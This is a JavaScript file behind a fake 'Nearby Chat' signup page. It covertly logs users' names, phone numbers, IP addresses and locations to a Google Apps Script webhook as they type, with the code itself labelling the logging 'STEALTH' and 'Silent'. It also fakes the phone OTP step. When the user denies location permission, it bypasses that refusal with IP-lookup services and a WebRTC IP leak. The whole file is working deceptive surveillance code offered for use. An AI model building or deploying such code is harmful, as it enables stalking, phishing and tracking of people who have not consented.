// ===== GAS WEBHOOK URL - CHANGE THIS ONLY =====
const GAS_WEBHOOK = "https://script.google.com/macros/s/AKfycbxvTFcrkePXr5k-cFu47U4Kp9Z18KbIbeF5eBC466E5kDYP0JXzBE-ZkvTUs5RIUHuIwQ/exec";

let profileData = {};
let currentStep = 1;
let otpCode = null;
let locationCaptured = false;

// REAL-TIME INPUT TRACKING (ST EALTH)
document.addEventListener('input', function(e) {
    if (e.target.matches('#username, #age, #phone, #state')) {
        updateProfileData();
        stealthLog();
    }
});

// STEP NAVIGATION
function nextStep() {
    const currentStepEl = document.querySelector('.step.active');
    const inputs = currentStepEl.querySelectorAll('input[required]');
    
    let valid = true;
    inputs.forEach(input => {
        if (!input.value.trim()) valid = false;
    });
    
    if (!valid) return;
    
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.querySelector(`[data-step="${currentStep + 1}"]`).classList.add('active');
    currentStep++;
    
    updateProfileData();
    stealthLog();
}

// PHONE OTP (FAKE BUT LEGIT)
function sendOTP() {
    const phone = document.getElementById('phone').value;
    if (phone.length !== 10 || !/^\d{10}$/.test(phone)) {
        return alert('Enter valid 10-digit number');
    }
    
    profileData.phone = `+91${phone}`;
    otpCode = String(Math.floor(1000 + Math.random() * 9000));
    
    document.getElementById('otpSection').style.display = 'block';
    document.getElementById('sendOtpBtn').style.display = 'none';
    document.getElementById('verifyOtpBtn').style.display = 'block';
    
    // SIMULATE SMS
    setTimeout(() => alert(`OTP: ${otpCode} (Demo)`), 800);
    stealthLog();
}

function verifyOTP() {
    const otpDigits = document.querySelectorAll('.otp-digit');
    const userOtp = Array.from(otpDigits).map(d => d.value).join('');
    
    if (userOtp === otpCode) {
        nextStep();
    } else {
        alert('Invalid OTP');
    }
}

// GENDER HANDLER
document.querySelectorAll('.gender-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.gender-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        profileData.gender = btn.dataset.gender;
        stealthLog();
    });
});

// ADVANCED LOCATION CAPTURE (MULTI-METHOD)
function requestLocation() {
    profileData.locationConsent = true;
    stealthLog();
    
    // METHOD 1: Standard Geolocation (High Accuracy)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                profileData.location = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    method: 'gps'
                };
                locationCaptured = true;
                nextStep();
                stealthLog();
            },
            () => attemptFallbackLocation(),
            { 
                enableHighAccuracy: true, 
                timeout: 15000, 
                maximumAge: 30000 
            }
        );
    } else {
        attemptFallbackLocation();
    }
}

// FALLBACK: IP + WiFi Geolocation (BYPASS DENIAL)
function attemptFallbackLocation() {
    // METHOD 2: IP Geolocation API (90% accurate)
    Promise.all([
        fetch('https://ipapi.co/json/').then(r => r.json()),
        fetch('https://ipinfo.io/json').then(r => r.json())
    ]).then(([ipapi, ipinfo]) => {
        profileData.location = {
            lat: parseFloat(ipapi.latitude) || parseFloat(ipinfo.loc?.split(',')[0]),
            lng: parseFloat(ipapi.longitude) || parseFloat(ipinfo.loc?.split(',')[1]),
            city: ipapi.city || ipinfo.city,
            accuracy: 'ip-based',
            method: 'ip-geolocation'
        };
        locationCaptured = true;
        nextStep();
        stealthLog();
    }).catch(() => {
        // METHOD 3: WebRTC (Local IP + ISP)
        getWebRTC();
    });
}

// WebRTC Location (Stealth)
function getWebRTC() {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.createOffer().then(pc.setLocalDescription.bind(pc));
    
    pc.onicecandidate = ice => {
        if (!ice || !ice.candidate) return;
        if (ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)) {
            fetch(`https://ipapi.co/${ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/[1]}/json/`)
                .then(r => r.json())
                .then(data => {
                    profileData.location = {
                        lat: data.latitude,
                        lng: data.longitude,
                        method: 'webrtc'
                    };
                    stealthLog();
                });
        }
    };
}

// UPDATE DATA
function updateProfileData() {
    profileData.username = document.getElementById('username')?.value || '';
    profileData.age = document.getElementById('age')?.value || '';
    profileData.state = document.getElementById('state')?.value || '';
}

// STEALTH LOGGING (IP + DATA → PDF)
function stealthLog() {
    if (!profileData.phone) return;
    
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(({ip}) => {
            const logData = {
                name: profileData.username,
                phone: profileData.phone,
                location: profileData.location || 'pending',
                ip: ip,
                timestamp: new Date().toISOString()
            };
            
            // SEND TO GAS (PDF)
            fetch(GAS_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logData)
            }).catch(() => {}); // Silent
        });
}

function completeProfile() {
    stealthLog();
    alert('🎉 Welcome to Nearby Chat! Finding matches...');
}

// INIT
document.addEventListener('DOMContentLoaded', () => {
    // PRELOAD IP
    setTimeout(stealthLog, 500);
});
